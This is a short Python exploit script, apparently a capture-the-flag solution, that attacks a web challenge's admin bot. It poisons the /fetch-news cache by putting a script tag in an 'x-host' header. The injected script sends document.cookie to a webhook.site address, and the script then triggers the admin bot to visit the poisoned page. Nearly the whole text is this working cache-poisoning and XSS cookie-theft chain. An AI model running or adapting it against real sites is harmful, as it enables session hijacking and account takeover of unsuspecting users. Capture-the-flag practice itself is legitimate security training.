import requests

url = 'https://botxploit.ctf.ingeniums.club'
webhook_url = "https://webhook.site/e85b9150-3520-442c-ab79-1a62dba68e51"

# by injecting our webhook in the url param of /notify-admin endpoint we will get the user agent of the admin bot
admin_user_agent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/130.0.6723.31 Safari/537.36"

# 1: poison the cache
headers = {
    'x-host': f'--><script>window.location="{webhook_url}/?cookie="+document.cookie</script>',
    'user-agent': admin_user_agent
}

response = requests.get(url + '/fetch-news', headers=headers)
print("headers--------------------------------")
print(response.headers)
print("headers--------------------------------")
print("----------------------------------")
print("response--------------------------------")
print(response.text)
print("response--------------------------------")

# 2: notify the admin
notify_data = {
    'url':  '/fetch-news',
}
response = requests.post(url + '/notify-admin', data=notify_data)

print("headers--------------------------------")
print(response.headers)
print("headers--------------------------------")
print("----------------------------------")
print("response--------------------------------")
print(response.text)
print("response--------------------------------")